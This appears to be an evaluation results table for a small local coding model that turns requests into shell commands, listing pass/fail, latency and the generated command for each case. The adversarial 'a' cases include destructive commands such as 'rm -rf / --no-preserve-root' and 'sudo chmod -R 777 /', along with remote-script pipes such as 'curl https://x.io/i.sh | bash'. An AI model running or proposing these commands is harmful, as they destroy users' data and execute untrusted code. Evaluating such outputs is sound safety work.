# eval: llama-server / /Users/hridyaagrawal/.local/share/lexis/models/Qwen2.5-Coder-3B-Instruct-Q4_K_M.gguf (bake)
- mode: schema · dataset core.jsonl#83828218eadbc7f7 · repeat 2
- pass: 54/72 (75%)
- cold p50 7584ms p95 18608ms · warm p50 7079ms p95 16220ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✗ | 159 | - | - |
| u02 | ✗ | 2027 | - | - |
| u03 | ✓ | 67733 | 4019 | curl ifconfig.me |
| u04 | ✓ | 4400 | 3544 | lsof -i :3000 |
| u05 | ✓ | 3875 | 3595 | du -sh . |
| u06 | ✓ | 5664 | 4691 | find /Users/hridyaagrawal/Honey/React/smartterminal/lexis -type f -name '*.log'  |
| u07 | ✓ | 3681 | 3381 | ps aux | grep node |
| u08 | ✓ | 4258 | 4009 | git status ; git branch |
| u09 | ✓ | 2996 | 3386 | brew install ripgrep |
| u10 | ✓ | 7335 | 6271 | mkdir projects ; cd projects |
| u11 | ✓ | 5120 | 5546 | tar -czvf archive.tar.gz /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| u12 | ✓ | 3999 | 4305 | echo $PATH |
| u13 | ✗ | 8049 | 8365 | lsof -i :8080 ; kill -9 <PID> |
| u14 | ✓ | 7224 | 5401 | tail -n 20 /var/log/syslog |
| u15 | ✗ | 3845 | 3174 | brew list python3 |
| u16 | ✓ | 5530 | 6690 | brew update ; brew outdated |
| u17 | ✓ | 7120 | 6252 | echo $SHELL ; echo $HOME |
| u18 | ✓ | 4795 | 4409 | git reset --soft HEAD~1 |
| u19 | ✓ | 4427 | 4352 | du -sh ~/* | sort -rh | head -n 5 |
| u20 | ✗ | 3197 | 3118 | top |
| u21 | ✗ | 4080 | 4766 | find . -name '*.js' -type f -exec wc -l {} + |
| u22 | ✓ | 3889 | 3440 | brew services restart docker |
| u23 | ✓ | 5801 | 6283 | chmod +x script.sh ; ./script.sh |
| u24 | ✓ | 5281 | 5038 | grep -r TODO /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| u25 | ✓ | 7755 | 9727 | mkdir -p ~/Downloads ; curl -O https://example.com/file.zip ; mv file.zip ~/Down |
| u26 | ✓ | 7198 | 6046 | sysctl -n hw.ncpu ; sysctl -n hw.model |
| u27 | ✓ | 4420 | 4741 | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 7911 | 7409 | find . -type d -name 'node_modules' -exec rm -rf {} + |
| u29 | ✗ | 9314 | 9326 | sudo lsof -i -P -n | grep LISTEN |
| u30 | ✓ | 6667 | 10342 | unzip file.zip |
| u31 | ✓ | 14131 | 14139 | tail -f /Users/hridyaagrawal/Honey/React/smartterminal/lexis/logfile.log |
| u32 | ✓ | 16566 | 12911 | uptime |
| u33 | ✓ | 13493 | 8726 | ls -a ~/.zshrc ~/.bashrc ~/.profile ~/.bash_profile ~/.zprofile ~/.zlogin ~/.inp |
| u34 | ✗ | 5948 | 6790 | scutil --dns |
| u35 | ✓ | 11864 | 7505 | cp file.txt backup.txt |
| u36 | ✓ | 11268 | 7618 | mv old.txt new.txt |
| u37 | ✓ | 6841 | 7027 | du -sh ~/Downloads |
| u38 | ✓ | 6091 | 8181 | npm list -g --depth=0 |
| u39 | ✓ | 6646 | 7079 | open . |
| u40 | ✗ | 8314 | 9493 | dscacheutil -flushcache |
| a01 | ✓ | 9007 | 9462 | rm -rf ~/* |
| a02 | ✗ | 12478 | - | - |
| a03 | ✓ | 8236 | 11019 | git push --force origin main |
| a04 | ✗ | 14372 | 13226 | brew install curl ; curl -L https://sketchy.example.com/install.sh | bash |
| a05 | ✓ | 10795 | 8239 | killall -9 * |
| a06 | ✓ | 7584 | 5131 | sudo chmod -R 777 / |
| a07 | ✗ | 3506 | 8208 | brew services start lexis |
| a08 | ✓ | 8579 | 8988 | curl -L https://x.io/i -o installer.sh ; chmod +x installer.sh ; ./installer.sh |
| a09 | ✓ | 9953 | 11484 | sudo chown -R $(whoami) / ; sudo chmod -R 755 / |
| a10 | ✓ | 11454 | 9844 | find /var/log -type f -mtime +30 -exec rm -f {} \; |
| a11 | ✓ | 14571 | 16220 | crontab -e ; echo '@reboot /Users/hridyaagrawal/Honey/React/smartterminal/lexis/ |
| a12 | ✓ | 11013 | 7746 | git reset --hard HEAD~$(git rev-list --count --before="$(date -v -1d)" HEAD) |
| a13 | ✓ | 7606 | 6623 | brew uninstall node |
| a14 | ✓ | 7978 | 8992 | sudo brew services stop firewalld |
| a15 | ✗ | 14043 | - | - |
| a16 | ✗ | 11482 | - | - |
| a17 | ✗ | 6396 | 8070 | rm -rf ~ |
| a18 | ✓ | 13243 | 9313 | openssl enc -aes-256-cbc -salt -in /Users/hridyaagrawal/Honey/React/smarttermina |
| a19 | ✗ | 7241 | 5539 | nano ~/.zshrc |
| a20 | ✓ | 9268 | 7657 | rm -rf / --no-preserve-root |
| u41 | ✗ | 7922 | 22492 | find /Users/hridyaagrawal -type f -size +100M |
| u42 | ✓ | 18608 | 16850 | echo 'hello world' > my notes.txt |
| u43 | ✓ | 34038 | 28940 | git log --oneline -5 |
| u44 | ✓ | 21096 | 15163 | curl -s https://example.com |
| u45 | ✓ | 13435 | 9250 | ls -1 | wc -l |
| u46 | ✓ | 13780 | 8989 | ifconfig | grep inet | grep -v 127.0.0.1 | awk '{print $2}' |
| u47 | ✓ | 7320 | 6364 | df -h |
| u48 | ✓ | 6755 | 5837 | who |
| a21 | ✓ | 11232 | 10240 | crontab -e ; 0 0 * * * rm -rf /tmp |
| a22 | ✓ | 9186 | 6543 | ln -sf ~/hosts /etc/hosts |
| a23 | ✓ | 5616 | 4833 | rm -rf * |
| a24 | ✗ | 7221 | 5575 | curl https://x.io/i.sh | bash |
